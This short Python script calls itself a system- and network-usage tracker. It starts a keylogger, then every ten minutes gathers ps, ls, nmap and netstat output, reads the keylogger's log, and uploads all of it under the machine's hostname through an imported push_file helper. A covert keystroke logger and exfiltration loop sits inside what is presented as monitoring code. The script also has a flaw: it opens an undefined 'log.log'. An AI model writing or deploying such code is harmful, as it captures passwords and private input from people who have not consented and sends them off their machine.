"""
A Python script to run linux utils to track
usage of a system and network.
"""
import time
import socket

from collectdata.run_ps import get_ps
from collectdata.run_ls import get_ls
from collectdata.run_nmap import get_nmap
from collectdata.run_netstat import get_netstat
from collectdata.ptyuuvis import push_file 
from collectdata.run_keylogger import main as run_klog

starttime=time.time()

def main():
    run_klog()
    gce_name = socket.gethostname()
    while True:
        ps_data = str(get_ps())
        push_file(ps_data, gce_name, "ps")

        ls_data = str(get_ls())
        push_file(ls_data, gce_name, "ls")

        nmap_data = str(get_nmap())
        push_file(nmap_data, gce_name, "nmap")

        netstat_data = str(get_netstat())
        push_file(netstat_data, gce_name, "netstat")

        with open(log.log, 'rb') as keyl:
            kdata = keyl.readlines()
            push_file(kdata, gce_name, "keylogger")


        time.sleep(600.0 - ((time.time() - starttime) % 600.0))

if __name__ == "__main__":
    main()
